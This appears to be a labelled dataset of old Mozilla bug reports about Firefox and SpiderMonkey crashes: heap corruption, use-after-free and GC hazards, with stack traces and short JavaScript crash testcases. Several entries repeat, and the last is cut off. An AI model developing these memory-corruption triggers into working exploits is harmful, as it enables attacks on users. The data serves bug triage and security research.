line 571 nshtmlscrollframe reflow mozilla/layout/generic/nsgfxscrollframe.cpp line 769 nscontainerframe reflowchild mozilla/layout/generic/nscontainerframe.cpp line 905 viewportframe reflow mozilla/layout/generic/nsviewportframe.cpp line 240 incrementalreflow dispatch mozilla/layout/base/nspresshell.cpp line 914 presshell processreflowcommands mozilla/layout/base/nspresshell.cpp line 6928 presshell willpaint mozilla/layout/base/nspresshell.cpp line 6565	11
heap corruption in nstablerowgroupframe calculaterowheights when loading in print preview i get a c runtime assertion complaining about heap corruption if it does n't crash for you try turning up your scaling level trace warning stack unwind information not available following frames may be wrong msvcr80d free_dbg msvcr80d free_dbg msvcr80d operator delete msvcr80d operator delete gklayout nstablerowgroupframe calculaterowheights class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate c mozilla\mozilla\layout\tables\nstablerowgroupframe.cpp 821 gklayout nstablerowgroupframe reflowchildren class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nsrowgroupreflowstate areflowstate unsigned int astatus int apagebreakbeforeend c mozilla\mozilla\layout\tables\nstablerowgroupframe.cpp 486 gklayout nstablerowgroupframe reflow class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate unsigned int astatus c mozilla\mozilla\layout\tables\nstablerowgroupframe.cpp 1280 gklayout nscontainerframe reflowchild class nsiframe akidframe class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate int ax 120 int ay 120 unsigned int aflags 0 unsigned int astatus c mozilla\mozilla\layout\generic\nscontainerframe.cpp 954 gklayout nstableframe reflowchildren struct nstablereflowstate areflowstate unsigned int astatus class nsiframe alastchildreflowed struct nsrect aoverflowarea c mozilla\mozilla\layout\tables\nstableframe.cpp 2828 gklayout nstableframe reflowtable struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate int aavailheight 27840 class nsiframe alastchildreflowed unsigned int astatus c mozilla\mozilla\layout\tables\nstableframe.cpp 2040 gklayout nstableframe reflow class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate unsigned int astatus c mozilla\mozilla\layout\tables\nstableframe.cpp 1933 gklayout nscontainerframe reflowchild class nsiframe akidframe class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate areflowstate int ax 0 int ay 0 unsigned int aflags 3 unsigned int astatus c mozilla\mozilla\layout\generic\nscontainerframe.cpp 954 gklayout nstableouterframe outerreflowchild class nsprescontext aprescontext class nsiframe achildframe struct nshtmlreflowstate aouterrs void achildrsspace struct nshtmlreflowmetrics ametrics int aavailwidth 15060 struct nssize adesiredsize struct nsmargin amargin unsigned int astatus c mozilla\mozilla\layout\tables\nstableouterframe.cpp 1112 gklayout nstableouterframe reflow class nsprescontext aprescontext struct nshtmlreflowmetrics adesiredsize struct nshtmlreflowstate aouterrs unsigned int astatus c mozilla\mozilla\layout\tables\nstableouterframe.cpp 1217 gklayout nsblockreflowcontext reflowblock struct nsrect aspace int aapplytopmargin 0 struct nscollapsingmargin aprevmargin int aclearance 0 int aisadjacentwithtop 1 struct nsmargin acomputedoffsets struct nshtmlreflowstate aframers unsigned int aframereflowstatus c mozilla\mozilla\layout\generic\nsblockreflowcontext.cpp 372 gklayout nsblockframe reflowblockframe class nsblockreflowstate astate class nslinelist_iterator aline class nslinelist_iterator int akeepreflowgoing c mozilla\mozilla\layout\generic\nsblockframe.cpp 2873 gklayout nsblockframe reflowline class nsblockreflowstate astate class nslinelist_iterator aline class nslinelist_iterator int akeepreflowgoing c mozilla\mozilla\layout\generic\nsblockframe.cpp 2115 gklayout nsblockframe reflowdirtylines class nsblockreflowstate astate c mozilla\mozilla\layout\generic\nsblockframe.cpp 1779 gklayout nsblockframe reflow class nsprescontext aprescontext struct nshtmlreflowmetrics ametrics struct nshtmlreflowstate areflowstate unsigned int astatus c mozilla\mozilla\layout\generic\nsblockframe.cpp 903 gklayout nsblockreflowcontext reflowblock struct nsrect aspace int aapplytopmargin 0 struct nscollapsingmargin aprevmargin int aclearance 0 int aisadjacentwithtop 1 struct nsmargin acomputedoffsets struct nshtmlreflowstate aframers unsigned int aframereflowstatus c mozilla\mozilla\layout\generic\nsblockreflowcontext.cpp 372 i ve also gotten all sorts of wonderful assertions not reduced at least at the moment	11
crash lookupucproperty with unminimised testcase using stirdom scriptfuzzer and xbl bindings to reproduce the crash extract the zipped testcase open file parentframe.htm usually the crash happens within 20 seconds or so talkback id tb29540796z lookupucproperty mozilla/js/src/jsapi.c line 2642 js_hasucproperty mozilla/js/src/jsapi.c line 3009 nshtmlexternalobjsh getproperty mozilla/dom/src/base/nsdomclassinfo.cpp line 8850 xpc_wn_helper_getproperty mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp line 962 js_getproperty mozilla/js/src/jsobj.c line 3515 js_valuetoiterator mozilla/js/src/jsiter.c line 395 js_interpret mozilla/js/src/jsinterp.c line 2764 i have n't tried minimising it yet this could be very tough or getting a regression range which also might be difficult because i could encounter crashes unrelated to this crash marking security sensitive because it also crashes on branch with a different stack	11
crash getchildlistnamefor with moz-box float position fixed block-in-inline assertion out-of-flow is already in the destroy queue adestroyqueue.indexof outofflowframe knotfound file users/jruderman/trunk/mozilla/layout/base/nscssframeconstructor.cpp line 9233 exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 libgklayout.dylib nscachedstyledata getstyledisplay 12 nsstylestructlist.h:95 1 libgklayout.dylib nsstylecontext getstyledisplay 20 nsstylestructlist.h:95 2 libgklayout.dylib nsiframe getstyledisplay const 83 nsstylestructlist.h:95 3 libgklayout.dylib getchildlistnamefor nsiframe 52 nscssframeconstructor.cpp:1716 4 libgklayout.dylib deletingframesubtree nsframemanager nsiframe 296 nscssframeconstructor.cpp:9303 5 libgklayout.dylib nscssframeconstructor contentremoved nsicontent nsicontent int int 1008 nscssframeconstructor.cpp:9453 6 libgklayout.dylib nscssframeconstructor reinsertcontent nsicontent nsicontent 74 nscssframeconstructor.cpp:9161 7 libgklayout.dylib nscssframeconstructor reframecontainingblock nsiframe 374 nscssframeconstructor.cpp:12698 8 libgklayout.dylib nscssframeconstructor mayberecreatecontainerforibsplitterframe nsiframe unsigned 141 nscssframeconstructor.cpp:10995 9 libgklayout.dylib nscssframeconstructor recreateframesforcontent nsicontent 173 nscssframeconstructor.cpp:11026 10 libgklayout.dylib nscssframeconstructor restyleelement nsicontent nsiframe nschangehint 192 nscssframeconstructor.cpp:9924 11 libgklayout.dylib nscssframeconstructor processonerestyle nsicontent nsrestylehint nschangehint 215 nscssframeconstructor.cpp:12787 12 libgklayout.dylib nscssframeconstructor processpendingrestyles 420 nscssframeconstructor.cpp:12834 13 libgklayout.dylib nscssframeconstructor restyleevent run 200 nscssframeconstructor.cpp:12904 14 libxpcom_core.dylib nsthread processnextevent int int 556 nsthread.cpp:483	11
additional problems in firefox 2.0 svg cairo_pen_init spun-off from bug 360645 comment 16 g30rgi 2007-02-25 11:49:10 pst make sure we do n't overflow the size_t for malloc if pen num_vertices return cairo_status_no_memory pen num_vertices seems of type signed int cairo_pen_vertices_needed does some operations on doubles and returns signed int so negative int will pass the check and cause trouble in malloc is it sure that num_vertices is nonnegativ in all cases comment 17 robert c seacord 2007-02-28 10:48:16 pst presumably pen num_vertices could be declared as an unsigned int as you would not normally expect a value like this to be negative a safer more localized fix may be to simply check for a lower bound i.e if pen num_vertices 0 pen num_vertices return cairo_status_no_memory it is usually best to eliminate the possibility of allocating zero bytes as this behavior is implementation defined comment 18 g30rgi 2007-03-01 00:38:44 pst another potential solution at least for gcc is pen num_vertices	11
memory corruption with tr style display inherit this testcase leads to crashes in entirely random places and times it might crash soon during gc or it might crash while writing bookmarks during shutdown or it might not crash at all you should restart firefox after loading the testcase to avoid data loss in a crash later memory corruption leading to random crashes including illegal instruction crashes sg critical you re also likely to see these two assertions assertion wrong display type on rowframe ns_style_display_table_row childframe getstyledisplay mdisplay file users/jruderman/trunk/mozilla/layout/tables/nstablerowframe.cpp line 1291 assertion invalid array index i length file dist/include/xpcom/nstarray.h line 318 and you might also see assertion span beyond the row size endcolindex 1 row.length file users/jruderman/trunk/mozilla/layout/tables/nscellmap.cpp line 2108 assertion bogus row index not reached file users/jruderman/trunk/mozilla/layout/tables/nscellmap.cpp line 399	11
because xulcommanddispatcher uses raw pointers access to deleted object is possible the testcase shows the bug with nsxulcommanddispatcher updater melement but it is possible that also nsxulcommanddispatcher mdocument and nsxulcommanddispatcher mfocuscontroller are problematic anyone willing to try to write testcases for the latter ones something where nsxulcommanddispatcher stays alive longer than document or focuscontroller	11
crashes nsvoidarray removeelementsat nstextcontrolframe fireoninput see bug 375093 talkback id tb30519322z msvcr80.dll nsvoidarray removeelementsat mozilla/xpcom/build/nsvoidarray.cpp line 591 nstextcontrolframe fireoninput mozilla/layout/forms/nstextcontrolframe.cpp line 2472 nstextinputlistener editaction mozilla/layout/forms/nstextcontrolframe.cpp line 517 nseditor notifyeditorobservers mozilla/editor/libeditor/base/nseditor.cpp line 1795 nsautoplaceholderbatch nsautoplaceholderbatch mozilla/editor/libeditor/base/nseditorutils.h line 66 possible fix	11
assertion some frame destructors were not called with xul listbox html td sg critical because a slightly modified version of the testcase makes firefox crash dereferencing a deleted object	11
fix possible to reflow while quote/counter lists are dirty if a reflow flush happens in the middle of an update e.g document.body.offsetwidth is accessed in a mutation event handler on a page with quotes or counters it s possible to reflow while the quote/counter lists have dangling pointers this is pretty undesirable i do n't have a testcase that demonstrates a problem here offhand but i bet fuzz-testing could find one	11
crash nsviewmanager addcoveringwidgetstoopaqueregion see unminimised testcase when i reach 801 in the statusbar current trunk builds crash it usually happens directly or after a reload talkback id tb31404174e nsviewmanager addcoveringwidgetstoopaqueregion mozilla/view/src/nsviewmanager.cpp line 619 nsviewmanager refresh mozilla/view/src/nsviewmanager.cpp line 538 this regressed for me between 2007-03-04 and 2007-03-05 i guess a regression from bug 363253 somehow i m getting this crash all the time when i use the thing from bug 339128 i suspect this is a windows only crash somehow i tried to crash in a windows debug build with gdb but there it would n't crash however i did see some cairo rules i guess these might indicate something cairo_win32_surface_composite bitblt de bewerking is voltooid cairo_win3_surface_acquire_dest_image de ingang is ongeldig cairo_win32_surface_set_clip_region reset de ingang is ongeldig the testcase is totally unminimised so this bug should be closed when i try to minimise it it just tends to crash less and less likely	11
crash presshell flushpendingnotifications when removing window on focus and then reappearing again see testcase which crashes mozilla within 500ms after load for me talkback id tb31415506e presshell flushpendingnotifications mozilla/layout/base/nspresshell.cpp line 4627 nsgfxscrollframeinner asyncscrollportevent run mozilla/layout/generic/nsgfxscrollframe.cpp line 1893 ns_processnextevent_p mozilla/xpcom/build/nsthreadutils.cpp line 227 nsbaseappshell run mozilla/widget/src/xpwidgets/nsbaseappshell.cpp line 154 msvcr80.dll on current branch builds i get this talkback id tb31415588y nsgenericelement setfocus mozilla/content/base/src/nsgenericelement.cpp line 2623 nsgenerichtmlelement setelementfocus mozilla/content/html/content/src/nsgenerichtmlelement.cpp line 3631 nshtmltextareaelement focus mozilla/content/html/content/src/nshtmltextareaelement.cpp line 236 xpcwrappednative callmethod mozilla/js/src/xpconnect/src/xpcwrappednative.cpp line 2156 xpc_wn_callmethod mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp line 1451 etc that stacktrace was fixed on trunk with the patch from bug 372665 after that fix the trunk builds have begun to crash with the first mentioned stacktrace marking security sensitive for now because the testcase also crashes on branch	11
try/catch-guard/finally bytecode still gc-unsafe the fix for bug 350312 with followup fix from bug 350837 is not enough consider function f try throw new error bad catch e if e null gc false catch e e is dangling now	9
self-modifying script detection can be circumvented i m not sure what bug 355655 is but at least self-modifying script detection can be circumvented by using subframe and event iframe iframe var d frames 0 document d.addeventlistener test function e s.compile true var e d.createevent events e.initevent test true true var s new script d.dispatchevent e s.exec	9
jsop get|set method and jsop_setconst assume atoms indexes 64k this is a spin-off of the bug 366122 comment 10 jsop get|set method and jsop_setconst implementation on 1.8 branches assume that their atom index is bellow 64k the following example demonstrate the problem with js shell m/1.8.1/mozilla/js/src cat m/files/y1.js var n 1 16 var src var x var array array for var i 0 i n/2 i array i i src array.join x x src array.join x src y.some_function var f function src var src2 f.tostring m/1.8.1/mozilla/js/src linux_all_opt.obj/js m/files/y1.js segmentation fault m/1.8.1/mozilla/js/src cat m/files/y2.js var n 1 16 var src var x var array array for var i 0 i n/2 i array i i src array.join x x src array.join x src y.function some_function 1 var f function src var src2 f.tostring m/1.8.1/mozilla/js/src linux_all_opt.obj/js m/files/y2.js segmentation fault m/1.8.1/mozilla/js/src cat m/files/y3.js var n 1 16 var src var x var array array for var i 0 i n/2 i array i i src array.join x x src array.join x src const some_const 10 eval src m/1.8.1/mozilla/js/src linux_all_opt.obj/js m/files/y3.js segmentation fault the bug does not exist on the trunk due to the generic fix in bug 365608	9
crash with use of sharp variable in function js_pctolinenumber js uneval 1 a 1 function return 1 segmentation fault js w a 1=function return 1 w.a segmentation fault in the first example the 1 is clearly illegal due to being out of scope right why does the function even compile is the second example also illegal here s the top of a stack trace from the js shell exception exc_bad_access codes kern_invalid_address at thread 0 crashed 0 js_pctolinenumber 68 jsscript.c:1519 1 js_reporterrornumberva 236 jscntxt.c:1141 2 js_reporterrornumber 96 jsapi.c:4672 3 js_interpret 90244 jsinterp.c:5336 4 js_execute 904 jsinterp.c:1607 5 js_executescript 64 jsapi.c:4212	9
inner function declaration in let-induced outer function body block gets wrong scope the fix for bug 357754 was just wrong the jsop_deflocalfun interpreter case would clone the compiler-created inner function object using a runtime block scope object cloned from the body block but then throw that object away each such local function would get its own unique cloned block for scope they all would therefore be unable to see the stack-stored values of let variables if any such inner function escaped and in looking they would crash related bug found while testing the splitting of jsop_return into jsop_setrval and a later jsop_setrval for return from finally must also happen for return from a block scope whether outer body or multiple nested block scopes without this splitting jsop_leaveblock wo n't run before return and if the return value or an out parameter helps the an inner function escape calling that escapee will run into the first bug testcases function foo let x 42 function bar return x return bar print foo baz false function foo2 let x 42 function bar return x try if baz return bar finally print finally x return bar print foo2 be	9
thunderbird crash on startup js_hashstring i got a bug report about thunderbird crashing on startup under certain conditions these conditions are mac os x 10.3.9 thunderbird 1.5.0.9 adblock plus 0.7.2.4 flashgot 0.5.97.03 and a specific patterns.ini that will be loaded by adblock plus on startup the crash is stable tb29095135z tb29095158g tb29095216x tb29095954k tb29096078k here is the stack from the talkback reports js_hashstring mozilla/js/src/jsstr.c line 2825 js_atomizestring mozilla/js/src/jsatom.c line 651 fun_xdrobject mozilla/js/src/jsfun.c line 1350 js_xdrobject mozilla/js/src/jsobj.c line 4323 js_xdrvalue mozilla/js/src/jsxdrapi.c line 544 xdratomlistelement mozilla/js/src/jsscript.c line 351 xdratommap mozilla/js/src/jsscript.c line 385 js_xdrscript mozilla/js/src/jsscript.c line 519 js_xdrscript mozilla/js/src/jsxdrapi.c line 579 nsxulprototypescript deserialize mozilla/content/xul/content/src/nsxulelement.cpp li nsxulprototypescript deserializeoutofline mozilla/content/xul/content/src/nsxulelemen nsxulprototypeelement deserialize mozilla/content/xul/content/src/nsxulelement.cpp l nsxulprototypedocument read mozilla/content/xul/document/src/nsxulprototypedocument nsxulprototypecache getprototype mozilla/content/xul/document/src/nsxulprototypecach nschromeprotocolhandler newchannel mozilla/chrome/src/nschromeprotocolhandler.cpp line 842 nsioservice newchannelfromuri ns_newchannel mozilla/mailnews/mime/src/mimecth.cpp line 172 nsdocshell douriload nsdocshell internalload nsdocshell loaduri nsdocshell loaduri nswebshellwindow initialize nsappshellservice justcreatetopwindow nsappshellservice createhiddenwindow nsappstartup createhiddenwindow xre_main mozilla/toolkit/xre/nsapprunner.cpp line 2271 start start not sure this crash can be reproduced but i will attach the patterns.ini file i was sent should be placed into the adblockplus directory in the profile since this seems to depend on the objects that adblock plus creates and since js_hashstring clearly gets a wrong memory location from somewhere i am marking this security sensitive just to be sure	9
getfunns does not call save_sp_and_pc jsop_getfunns does not call save_sp_and_pc before calling js_getfunctionnamespace the latter on the first initialization of function namespace can call js_initclass for namespace and qname classes which uses the stack for the constructor call in that the unsaved portion of the stack will be nuked i was hit by that while developing fixes for bug 370016 bug 370048 and bug 369740 but without a fix for bugs i was not able to come up so far with a test case to show the bug with code like with math print function sin the function sin triggers not found function exception that in turn throws away the damaged portion of the stack but the bug should be visible in the js debugger	9
gc hazard in getproperty from jsxml.c getproperty from jsxml.c when called for xml list converts the propety value into qname and without rooting it calls self recursively for list s elements passing the original value as id this can be exploited as the following example demonstrates m/trunk/mozilla/js/src cat s/y.js var list a c a var result list tostring f c 0 function f this.c if this.c 1 for var i 0 i 10000 i new qname return c else gc return c gc m/trunk/mozilla/js/src linux_all_dbg.obj/js s/y.js before 600080 after 64624 break 09b6d000 assertion failure offsetinarena gc_things_size at jsgc.c:494 trace/breakpoint trap here on the first invocation f as tostring implementation makes sure that the current free list for qnames is emptied and new arenas are allocated on the second invication it runs gc that collects the previously allocated qnames including the one that exists in getproperty frame and free their gc arenas then uppermost getproperty on return put the qname pointed to freed memory into live xml list object as its target property that triggers the crash during the second gc	9
nosuchmethod allocates beyond fp script depth the following test case for the jsshell demonstrates the problem m/trunk/mozilla/js/src cat s/y.js var obj get nosuchmethod print executed return new object obj.x m/trunk/mozilla/js/src linux_all_dbg.obj/js s/y.js executed assertion failure js_uptrdiff fp sp fp spbase depthdiff at jsinterp.c:347 trace/breakpoint trap the bug exists in 1.8.1 as well but not in 1.8.0	9
assertion failure c cs length addcharacterrangetocharset with q-b i js q-b i.exec assertion failure c cs length at jsregexp.c:2219 security-sensitive for now because the code involved is playing with bit arrays 0 js js_assert 70 jsutil.c:60 1 js addcharacterrangetocharset 111 jsregexp.c:2235 2 js processcharset 2516 jsregexp.c:2431 3 js initmatch 636 jsregexp.c:3320 4 js js_executeregexp 435 jsregexp.c:3369 5 js regexp_exec_sub 1047 jsregexp.c:4121 6 js regexp_exec 53 jsregexp.c:4137 7 js js_invoke 2954 jsinterp.c:1353	9
assertion failure vlength n calling uneval this involves proto and serialization using sharps js function f f.__proto this this.m setter f uneval this assertion failure vlength n at jsobj.c:938 the code is trying to remove function and from something that turns out to be a sharp variable security sensitive because it looks like the code might jump past the end of a string remove function from the beginning of valstr and from the end so that we can put get in front of the function definition if gsop j value_is_function cx val j size_t n strlen js_function_str 2 js_assert vlength n vchars n vlength n 1 strange behavior in opt js function f f.__proto this this.m setter f uneval this f 1 prototype set m 1 js function f f.hhhhhhhhh this this.m setter f uneval this 1 f 2=function f set m 2	11
assertion failure flagp gcf_final with post-increment to reproduce paste this into jsshell this.__definesetter x gc this.__definegetter x math.sin x x debug assertion failure flagp gcf_final at jsgc.c:2499 opt exception exc_bad_access codes kern_protection_failure at thread 0 crashed 0 js js_emittree 11342 1 js js_markstackframe 325 2 js js_gc 816 3 js js_gc 66 4 js gc 34 5 js js_invoke 1843 6 js js_internalinvoke 181 7 js js_internalgetorset 261 8 js js_nativeset 165 9 js js_setproperty 1084 10 js js_interpret 6390 11 js js_execute 513 12 js js_executescript 56 13 js process 1105 14 js main 2270 15 js start 216 16 js start 41	11
interpreter on 1.8 does not clear obj register during inline calls currently the interpreter on 1.8 branches does not clear the object register during when returning from the inlined call thus for a case like f where f is inlined the interpreter passes as this to the second call the value of obj register left from f invocation instead of unconditional null as demonstrated by the following example var fthis function f fthis this return x f x f if this fthis throw bad this currently when invoked in js shell from 1.8 branches the code throws the exception m/1.8.1/mozilla/js/src linux_all_dbg.obj/js s/y.js uncaught exception bad this m/1.8.1/mozilla/js/src cd m/1.8.0/mozilla/js/src m/1.8.0/mozilla/js/src linux_all_dbg.obj/js s/y.js uncaught exception bad this this is exploitable since a branch callback called when the inlined function returns can trigger gc and the value stored in obj register is not rooted for example when the example is run against 1.8.1 shell with branch callback enabled the code crashes during this calculations as on 1.8.1 the branch callback calls invokes th gc at the right moment m/1.8.1/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js segmentation fault the crash does not happen with 1.8.0 shell due to difference in maybegc implementation with enabled branch callback it crashes m/1.8.1/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js segmentation fault while on 1.8.0 the code gives m/1.8.0/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js uncaught exception bad this	11
assertion failure vchars vchars with uneval and setter function whose proto has been changed js f function y p getter f f.__proto uneval y assertion failure vlength n at jsobj.c:963	11
assertion failure flagp gcf_final with getter setter watch and more js gc-crash.js assertion failure flagp gcf_final at jsgc.c:2147	11
interpreter uses goto out where it should jump to bad_inline_call the code in the interpreter implementing the inline call logic in couple of places uses goto out where it should use goto bad_inline_call this is exploitable if a script can trigger object allocation failure during inline call in this case the interpreter will goto to the exception handling code where it would use pc from the parent frame while script and other registers will be set to the new frame but it is rather unlikely that such precise control of memory allocation is feasible	11
assertion failure slot uint32 obj dslots 1 with prototype=regexp function f x prototype a if x return b return c else return d void f false triggers assertion failure slot uint32 obj dslots 1 at jsobj.c:4990 0 js_assert 1 js_setrequiredslot 380 jsobj.c:4990 2 js_setreservedslot 188 jsapi.c:4013 3 js_interpret 66856 jsinterp.c:4266 4 js_execute 715 jsinterp.c:1591 5 js_executescript 54 jsapi.c:4693 6 process 912 js.c:268 7 processargs 2045 js.c:519 8 main 612 js.c:3271 9 start 216 10 start 41	11
assertion failure vlength n calling uneval this involves proto and serialization using sharps js function f f.__proto this this.m setter f uneval this assertion failure vlength n at jsobj.c:938 the code is trying to remove function and from something that turns out to be a sharp variable security sensitive because it looks like the code might jump past the end of a string remove function from the beginning of valstr and from the end so that we can put get in front of the function definition if gsop j value_is_function cx val j size_t n strlen js_function_str 2 js_assert vlength n vchars n vlength n 1 strange behavior in opt js function f f.__proto this this.m setter f uneval this f 1 prototype set m 1 js function f f.hhhhhhhhh this this.m setter f uneval this 1 f 2=function f set m 2	11
assertion failure flagp gcf_final with post-increment to reproduce paste this into jsshell this.__definesetter x gc this.__definegetter x math.sin x x debug assertion failure flagp gcf_final at jsgc.c:2499 opt exception exc_bad_access codes kern_protection_failure at thread 0 crashed 0 js js_emittree 11342 1 js js_markstackframe 325 2 js js_gc 816 3 js js_gc 66 4 js gc 34 5 js js_invoke 1843 6 js js_internalinvoke 181 7 js js_internalgetorset 261 8 js js_nativeset 165 9 js js_setproperty 1084 10 js js_interpret 6390 11 js js_execute 513 12 js js_executescript 56 13 js process 1105 14 js main 2270 15 js start 216 16 js start 41	11
interpreter on 1.8 does not clear obj register during inline calls currently the interpreter on 1.8 branches does not clear the object register during when returning from the inlined call thus for a case like f where f is inlined the interpreter passes as this to the second call the value of obj register left from f invocation instead of unconditional null as demonstrated by the following example var fthis function f fthis this return x f x f if this fthis throw bad this currently when invoked in js shell from 1.8 branches the code throws the exception m/1.8.1/mozilla/js/src linux_all_dbg.obj/js s/y.js uncaught exception bad this m/1.8.1/mozilla/js/src cd m/1.8.0/mozilla/js/src m/1.8.0/mozilla/js/src linux_all_dbg.obj/js s/y.js uncaught exception bad this this is exploitable since a branch callback called when the inlined function returns can trigger gc and the value stored in obj register is not rooted for example when the example is run against 1.8.1 shell with branch callback enabled the code crashes during this calculations as on 1.8.1 the branch callback calls invokes th gc at the right moment m/1.8.1/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js segmentation fault the crash does not happen with 1.8.0 shell due to difference in maybegc implementation with enabled branch callback it crashes m/1.8.1/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js segmentation fault while on 1.8.0 the code gives m/1.8.0/mozilla/js/src linux_all_dbg.obj/js b 1000 s/y.js uncaught exception bad this	11
assertion failure vchars vchars with uneval and setter function whose proto has been changed js f function y p getter f f.__proto uneval y assertion failure vlength n at jsobj.c:963	11
assertion failure flagp gcf_final with getter setter watch and more js gc-crash.js assertion failure flagp gcf_final at jsgc.c:2147	11
interpreter uses goto out where it should jump to bad_inline_call the code in the interpreter implementing the inline call logic in couple of places uses goto out where it should use goto bad_inline_call this is exploitable if a script can trigger object allocation failure during inline call in this case the interpreter will goto to the exception handling code where it would use pc from the parent frame while script and other registers will be set to the new frame but it is rather unlikely that such precise control of memory allocation is feasible	11
assertion failure slot uint32 obj dslots 1 with prototype=regexp function f x prototype a if x return b return c else return d void f false triggers assertion failure slot uint32 obj dslots 1 at jsobj.c:4990 0 js_assert 1 js_setrequiredslot 380 jsobj.c:4990 2 js_setreservedslot 188 jsapi.c:4013 3 js_interpret 66856 jsinterp.c:4266 4 js_execute 715 jsinterp.c:1591 5 js_executescript 54 jsapi.c:4693 6 process 912 js.c:268 7 processargs 2045 js.c:519 8 main 612 js.c:3271 9 start 216 10 start 41	11
evil testcase using multiple display table-caption causes crash if you are really determined nsiframe hasview see upcoming testcase i hope to simplify it further some other day not sure if it says anything bug it does n't crash mozilla1.7 talkback id tb9544861z	9
crash with evil xbl testcase using alert in constructor see upcoming testcase which crash mozilla after clicking for the second time on the alert also crashes mozilla1.7 so no recent regression talkback id tb16399392w nscssframeconstructor wipecontainingblock nscssframeconstructor contentinserted marking security sensitive because the first line of the stack looks funny please unmark the security flag if this is not a security issue	9
crash getniforspecialsibling with display table-caption and display table-row-group see upcoming testcase which crashes current trunk mozilla builds on load it could be that it s only crashing after second load it consists of this table style display table-caption keygen style display table-caption span style display table-caption span style display table-row-group body style display table-row-group input talkback id tb19965177z getniforspecialsibling nscssframeconstructor findframewithcontent nscssframeconstructor findprimaryframefor nsframemanager getprimaryframefor nscssframeconstructor findprimaryframefor nsframemanager getprimaryframefor nscssframeconstructor findprimaryframefor nsframemanager getprimaryframefor nsgenericelement getprimaryframefor nsgenerichtmlelement getformcontrolframe nshtmlinputelement savestate this regressed between 2005-11-30 and 2005-12-15 ria you have builds inbetween to look for a narrower regression range	9
crash dodeletingframesubtree nsiframe getnextsibling nscssframeconstructor findframewithcontent with 1.8.0.5 and 1.8.1 branch see upcoming testcase it crashes ff1.5.0.5rc and ff2 but not current trunk build i can minimise the testcase if desired talkback id tb20766966m dodeletingframesubtree c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9675 deletingframesubtree c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9754 nscssframeconstructor contentremoved c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9973 nscssframeconstructor reinsertcontent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9623 nscssframeconstructor contentinserted c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 9526 nscssframeconstructor recreateframesforcontent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 11983 nscssframeconstructor processrestyledframes c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 10447 nscssframeconstructor restyleelement c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 10519 nscssframeconstructor processonerestyle c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 13956 nscssframeconstructor processpendingrestyles c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 14004 nscssframeconstructor restyleevent handleevent c builds/tinderbox/fx-mozilla1.8.0-release/winnt_5.2_depend/mozilla/layout/base/nscssframeconstructor.cpp line 14066	9
crash nsimageframe sourcerecttodest on reload and removing table-caption styles see upcoming testcase which crashes on reload in current trunk build this regressed between 2005-12-03 and 2005-12-04 probably a regression from bug 309322 i guess there is a security issue here	9
crash nsboxframe appendframes removing xul tabs during onselect loading this testcase makes firefox debug crash with nsboxframe appendframes nsframemanager appendframes nscssframeconstructor appendframes nightlies crash too but with a slightly different stack trace	9
svg viewbox=twisted and image width height x y twisted memset fbrasterizetrapezoid svg viewbox=twisted and image width height x y twisted cause crash in memset on macosx ppc 2.0 branch trunk complains about not being able to allocate memory may be related to bug 358767 2.0-latest crashes badly program received signal exc_bad_access could not access memory reason kern_invalid_address at address in memset_pattern at system/library/frameworks/system.framework/privateheaders/ppc/cpu_capabilities.h:193 193 system/library/frameworks/system.framework/privateheaders/ppc/cpu_capabilities.h no such file or directory in system/library/frameworks/system.framework/privateheaders/ppc/cpu_capabilities.h gdb bt 0 in memset_pattern at system/library/frameworks/system.framework/privateheaders/ppc/cpu_capabilities.h:193 1 in memset 2 in fbrasterizetrapezoid 3 in cairo_pixman_add_trapezoids 4 in cairo_image_surface_assume_ownership_of_data 5 in cairo_surface_composite_trapezoids 6 in cairo_clip_combine_to_surface 7 in cairo_clip_clip 8 in cairo_clip_preserve 9 in cairo_clip 10 in nssvgcairocanvas setcliprect 11 in nssvgimageframe paintsvg 12 in nssvggframe paintsvg 13 in nssvgoutersvgframe paint 14 in nscontainerframe paintchild 15 in nscontainerframe paintchildren 16 in nshtmlcontainerframe paint 17 in canvasframe paint 18 in presshell paint 19 in nsview paint 20 in nsviewmanager renderdisplaylistelement 21 in nsviewmanager renderviews 22 in nsviewmanager refresh 23 in nsviewmanager dispatchevent 24 in viewwrapper getinterface 25 in nswindow dispatchevent trunk ca n't allocate memory firefox-bin 673 malloc vm_allocate size=2639417344 failed error code=3 firefox-bin 673 malloc error ca n't allocate region firefox-bin 673 malloc set a breakpoint in szone_error to debug firefox-bin 673 malloc vm_allocate size=2639417344 failed error code=3 firefox-bin 673 malloc error ca n't 